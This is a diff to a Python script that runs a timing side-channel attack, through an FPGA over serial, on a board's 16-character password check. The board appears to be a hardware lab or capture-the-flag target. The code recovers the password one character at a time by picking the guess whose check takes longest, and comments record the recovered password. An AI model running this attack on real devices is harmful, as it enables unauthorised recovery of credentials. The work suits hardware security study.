@@ -1,5 +1,6 @@
 #!/usr/bin/env python3
 
+import math
 import serial
 import time
 import sys
@@ -83,215 +84,234 @@ def normalize_array(arr):
     normalized_arr = arr / np.linalg.norm(arr, ord=1)
     return normalized_arr
 
+
 def convert_ns_to_us(ns_array):
     ns_array = np.array(ns_array, dtype=np.float64)
     ms_array = ns_array / 1_000
     return ms_array
 
-def set_delay(delay: int): # delay in cycles
-    d = 'D'.encode("ascii")
-    num = ser.write(d)
-    if num != 1:
-        raise Exception("Failed sending 'D'")
-    d = 'd'.encode("ascii")
-    for i in range(delay):
+
+SYSTEM_CLOCK = 32000000
+BAUD_RATE = 115200
+UART_FULL_ETU = (SYSTEM_CLOCK/BAUD_RATE)
+UART_HALF_ETU = ((SYSTEM_CLOCK/BAUD_RATE)/2)
+TO_US = 1/(SYSTEM_CLOCK/1_000_000)
+
+
+def to_us(delay):
+    return math.floor(delay * TO_US)
+
+
+def set_delay(delay: int):  # delay in cycles
+
+    print(f"===== Delaying for {delay} cycles=========")
+    print(f"===== Delaying for {to_us(delay)} us=========")
+
+    def send_char(c):
+        d = c.encode("ascii")
         num = ser.write(d)
         if num != 1:
-            raise Exception("Failed sending 'd'")
-    print(f"Delaying for {delay*100} us")
+            raise Exception(f"Failed sending '{c}'")
+
+    send_char('D')  # Reset delay
+
+    if delay > 1000:
+        a_count = delay // 1000
+        delay = delay % 1000
+        for i in range(a_count):
+            send_char('a')
+
+    if delay > 100:
+        d_count = delay // 100
+        delay = delay % 100
+        for i in range(d_count):
+            send_char('d')
+
+    if delay > 10:
+        f_count = delay // 10
+        delay = delay % 10
+        for i in range(f_count):
+            send_char('f')
+
+    if delay > 0:
+        v_count = delay
+        for i in range(v_count):
+            send_char('v')
 
 
-# Returns time in nanoseconds
+# Returns time in cycles
 def get_time():
     d = 't'.encode("ascii")
     num = ser.write(d)
     if num != 1:
         raise Exception("Failed sending 't'")
     tags = ser.read_until(b'!').decode()
+    dollar_count = tags.count('$')*1000
     hash_count = tags.count('#')*100
     dot_count = tags.count('.')*1
     plus_count = tags.count('+')*10
 
-    return hash_count + dot_count + plus_count
-
-
-
-def test_window():
-    # r = 80
-    # var_arr = np.zeros((r, r))
-    # for i in range(r):
-    #     variance = generate_graph(i)
-    #     var_arr[0][i] = variance
-    #     var_arr[1][i] = i
-    generate_graph(0, True)
-    # print(var_arr)
-    # x = var_arr[1]
-    # y = var_arr[0]
-    # plt.clf()
-    # plt.plot(x,y, 'o-')
-    # plt.savefig(f"mygraph_delays.png")
-
-
-def generate_graph(delay, plot=False):
-    plt.clf()
-    CHARS = digits + ascii_letters + punctuation
-    PWD_ARR = ['0' for i in range(16)]
-    arr_diff_2 = np.zeros((2, len(CHARS)), dtype=np.int64)
-
-    set_delay(delay)
-    pwd_str = "".join(PWD_ARR)
-    send_command(Command.SET_PWD, pwd_str)
-    time.sleep(0.1)
-
-    while True:
-        for i in range(len(arr_diff_2[0])):
-
-            send_command(Command.SEND_PWD)
-            if not pwd_failed():
-                raise Exception("Password was correct")
-            dtime = get_time()
-            arr_diff_2[0][i] = dtime
-            arr_diff_2[1][i] = time.perf_counter_ns()
-
-        print(arr_diff_2[0])
-        y = arr_diff_2[0].copy()
-        y -= y.min()
-        print(y)
-        print(f"Variance: {np.var(arr_diff_2[0])}")
-        delay += 1
-        set_delay(delay)
-
-        if np.var(arr_diff_2[0]) == 0:
-            print("===============FOUND IT=================")
-            break
-
-    # Linear regression on the data
-    #x = arr_diff_2[1].reshape(-1, 1)
-    #y = arr_diff_2[0].reshape(-1, 1)
-    #model = LinearRegression()
-    #model.fit(x, y)
-    #r_sq = model.score(x, y)
-    #print('coefficient of determination:', r_sq)
-    #print('intercept:', model.intercept_)
-    #print('slope:', model.coef_)
-    #y_pred = model.predict(x)
-    #print('predicted response:', y_pred, sep='')
-
-    # Set x axis to 0 and milliseconds
-    #arr_diff_2[1] -= arr_diff_2[1][0]
-    x =  arr_diff_2[1].copy()
-    x -= arr_diff_2[1].min()
-    x =  convert_ns_to_us(convert_ns_to_us(x))
-    x =  x.astype(np.int64)
-
-    # Set y axis to milliseconds
-    y = arr_diff_2[0].copy()
-    y -= y.min()
-    #y = convert_ns_to_us(y)
-
-
-    #coeffs = np.empty(arr_diff_2.shape[0])
-    #for i, row in enumerate(arr_diff_2):
-    #    coeffs[i] = LinearRegression().fit(row[:, None], range(len(row))).coef_
-    #print(coeffs)
-
-    print(y)
-
-    # Print statistics
-    variance = np.var(y)
-    mean = np.mean(y)
-    std = np.std(y)
-    median = np.median(y)
-    print(f"Variance: {variance}")
-    print(f"Mean: {mean} us")
-    print(f"Median: {median} us")
-    print(f"Max: {arr_diff_2[0].max() / 1_000_000} ms")
-    print(f"Min: {arr_diff_2[0].min() / 1_000_000} ms")
-
-    if plot:
-        # Create plot
-        plt.text(0.8, 0.9, f'Mean: {mean:.2f}', transform=plt.gca().transAxes)
-        plt.text(0.8, 0.85, f'Variance: {variance:.2f}', transform=plt.gca().transAxes)
-        plt.ylabel("Time difference (us)")
-        plt.xlabel("Time (ms)")
-        plt.title(f"Time difference between password attempts over time. Delay: {delay*10} us")
-        #plt.xticks(range(min(x), max(x)+1, max(x).astype(int) / 20) )
-        plt.plot(x,y, 'o-')
-        plt.savefig(f"mygraph_{delay}.png")
-
-    return variance
+    return hash_count + dot_count + plus_count + dollar_count
 
 
 def main():
-    # ============== Main ==============
+    # [0] -> 92_055 cycles H
+    # [1] -> 92_275 cycles 4
+    # [2] -> 92_500 cycles r
+    # [3] -> 92_450 cycles d
+    # start: 2850*32
+    # first difference jump seen at: 91476 cycles
+    bruteforce_pwd(92_055)
+    # bruteforce_pwd(92055, True)
 
-    # Init global variables
-    CHARS = digits + ascii_letters + punctuation
-    PWD_ARR = [CHARS[0] for i in range(16)]
+# Wenn ein "p" beim FPGA ankommt dann wird das Board resettet und der timing counter auf 0 gesetzt, und in den RESET_THEN_SEND state gewechselt.
+# Im RESET_THEN_SEND state warte ich bis ich 29 Zeichen vom Board empfangen habe also ich warte auf "Please enter the password:"
+# danach wechsel ich in den DELAY_SEND state. Im DELAY_SEND state warte ich delay * (`SYSTEM_CLOCK / 1000 / 1000) Zeiteinheiten(Mikrosekunden).
+# Danach wechsel ich in den SEND_PWD state.
+# Im SEND_PWD state sende ich 16 Zeichen beim 16. gesendetem Zeichen aktiviere ich den timing counter um den Passwort check zu timen
+# und gehe in den IDLE state.
+# Im IDLE state wird der timer deaktiviert sobald das erste Zeichen vom Board empfangen wurde.
 
-    # Initialize arrays
-    arr_diff = np.zeros((16, len(CHARS)), dtype=np.int32)
-    prev_i = 0
 
-
-    reset()
-    pwd_temp = send_command(Command.GET_PWD)
-    if pwd_temp != "ABCDEFGHIJKLMNOP":
-        print(f"Password is not default. Is '{pwd_temp}'")
-
-    try:
-        for pwd_i in range(16):
-            for (c_i, c) in enumerate(CHARS):
-                PWD_ARR[pwd_i] = c
-
-                # If we jumped to next password index
-                if prev_i != pwd_i:
-
-                    # Find character with highest time
-                    max_index = np.argmax(arr_diff[prev_i])
-                    sol_char = CHARS[max_index]
-
-                    # Set previous index character to character with highest time
-                    PWD_ARR[prev_i] = sol_char
-
-                    #if pwd_i == 3:
-                    #    raise KeyboardInterrupt()
-
+def find_timing(start_delay, offset, index, PWD_ARR):
+    CHARS = digits + ascii_letters
+    PWD_ARR = PWD_ARR.copy()
+    delay = start_delay + offset
+    a = 0
+    while True:
+        print(f"====== FIND TIMING ======. With delay increase: {delay - start_delay} cycles. ")
+        set_delay(delay)
+        max_index_arr = np.zeros(15, dtype=np.int64)
+        variance_arr = np.zeros(len(max_index_arr), dtype=np.int64)
+        for b in range(len(max_index_arr)):
+            arr_diff_2 = np.zeros((2, len(CHARS)), dtype=np.int64)
+            for c in range(len(CHARS)):
+                PWD_ARR[index] = CHARS[c]
                 pwd_str = "".join(PWD_ARR)
-                print(f"Cracking password: {pwd_str} pwd_i: {pwd_i} c_i: {c_i}")
                 send_command(Command.SET_PWD, pwd_str)
-
-                start = time.perf_counter_ns()
                 send_command(Command.SEND_PWD)
+                if not pwd_failed():
+                    raise Exception("Password was correct")
+                dtime = get_time()
+                arr_diff_2[0][c] = dtime
+                arr_diff_2[1][c] = time.perf_counter_ns()
 
-                if pwd_failed():
-                    arr_diff[pwd_i][c_i] = get_time()
-                    os.system('clear')
-                else:
-                    print(f"====== Password is '{pwd}' ==========")
-                    break
-                prev_i = pwd_i
-    except KeyboardInterrupt:
-        print("Exiting")
+            y = arr_diff_2[0].copy()
+            y -= y.min()
+            #mean = arr_diff_2[0].mean()
+            #print(f"Mean time: {mean}")
+            max_index = np.argmax(y)
+            max_index_arr[b] = max_index
+            #print(f"{arr_diff_2[0]}")
+            #print(f"{y}")
+            #print(f"Max index: {max_index}")
+            print(f"Correct char: { CHARS[max_index]}")
+            if y.max() > 300:
+                print("==> Max time is over 300. Seems correct")
+                #print(f"{y}")
+            variance_arr[b] = np.var(arr_diff_2[0])
+            #print(f"Variance: {variance_arr[b]}")
 
+        print("==================================")
+        #print(f"Max index arr: {max_index_arr}")
+        most_freq = np.bincount(max_index_arr).argmax()
+        #print(f"Most frequent: {most_freq}")
+        winning_c = CHARS[most_freq]
+        print(f"Most frequent character: {winning_c}")
 
-    for i in range(prev_i +1):
-        print("="*10 +  f"[{i}]" + "="*10)
-        print(f"{arr_diff[i]}")
-        print(f"[{i}]: Variance: {np.var(arr_diff[i])}")
-        print(f"[{i}]: Normalized Variance: {np.var(norm_array[i])}")
+        median_var = np.median(variance_arr)
+        print(f"Median variance: {median_var}")
 
+        if np.bincount(max_index_arr).max() >= 10 and median_var > 1000:
+            winning_c = CHARS[most_freq]
+            print(f"Winning character: {winning_c}")
+            a += 1
+            return delay
+        else:
+            delay += 20
 
-    # Close the serial port
-    ser.close()
+        if a == 16:
+            print("=====DONE=====")
+            break
 
+# H4rdc0r3H4rdw4r3
+def bruteforce_pwd(delay, plot=False):
+    CHARS = digits + ascii_letters
+    PWD_ARR = ['0' for i in range(16)]
 
+    delay = 93_090
+    set_delay(delay)
+    PWD_ARR[0] = 'H'  # 92_055
+    PWD_ARR[1] = '4'  # 92_275
+    PWD_ARR[2] = 'r'  # 92_500
+    PWD_ARR[3] = 'd'  # 92_450
+    PWD_ARR[4] = 'c'  # 92_650
+    PWD_ARR[5] = '0'  # 92_920
+    PWD_ARR[6] = 'r' # 92_870
+    #PWD_ARR[7] = '3' # 93_090
+    a = 7
+    while True:
+        arr_diff_2 = np.zeros((2, len(CHARS)), dtype=np.int64)
+        pwd_str = "".join(PWD_ARR)
+        send_command(Command.SET_PWD, pwd_str)
+        print(f"============= Start password: {pwd_str} ============= ")
+        time.sleep(0.1)
 
+        max_index_arr = np.zeros(15, dtype=np.int64)
+        for b in range(len(max_index_arr)):
+            for c in range(len(arr_diff_2[0])):
+                PWD_ARR[a] = CHARS[c]
+                pwd_str = "".join(PWD_ARR)
+                send_command(Command.SET_PWD, pwd_str)
+                send_command(Command.SEND_PWD)
+                if not pwd_failed():
+                    raise Exception("Password was correct")
+                dtime = get_time()
+                arr_diff_2[0][c] = dtime
+                arr_diff_2[1][c] = time.perf_counter_ns()
+
+            # print(f"{arr_diff_2[0]}")
+            y = arr_diff_2[0].copy()
+            y -= y.min()
+            #mean = arr_diff_2[0].mean()
+            #print(f"Mean time: {mean}")
+
+            max_index = np.argmax(y)
+            max_index_arr[b] = max_index
+            #print(f"Max index: {max_index}")
+            if y.max() > 300:
+                print("==> Max time is over 300. Seems correct")
+                #print(f"{y}")
+            print(f"Correct char: { CHARS[max_index]}",)
+            # print(f"Variance: {np.var(arr_diff_2[0])}")
+
+        #print(f"Max index arr: {max_index_arr}")
+        most_freq = np.bincount(max_index_arr).argmax()
+        #print(f"Most frequent: {most_freq}")
+        winning_c = CHARS[most_freq]
+        print(f"Winning character: {winning_c}")
+        PWD_ARR[a] = winning_c
+        print("New password: " + "".join(PWD_ARR))
+        num_winning = np.bincount(max_index_arr).max()
+        if num_winning < 6:
+            print(f"Num winning is too low: {num_winning} of {len(max_index_arr)}")
+            print("============= FAILED ============= ")
+            return False
+
+        new_delay = find_timing(delay, 100, a+1, PWD_ARR)
+        print(f"Delay diff is: { new_delay - delay}")
+        #delay += 200
+        set_delay(new_delay)
+
+        if a == 15:
+            print("=====DONE=====")
+            break
+
+        a += 1
 if __name__ == "__main__":
     try:
-        #main()
-        test_window()
+        main()
     except Exception as ex:
         extype, value, tb = sys.exc_info()
         traceback.print_exc()
-        pdb.post_mortem(tb) 
+        pdb.post_mortem(tb)
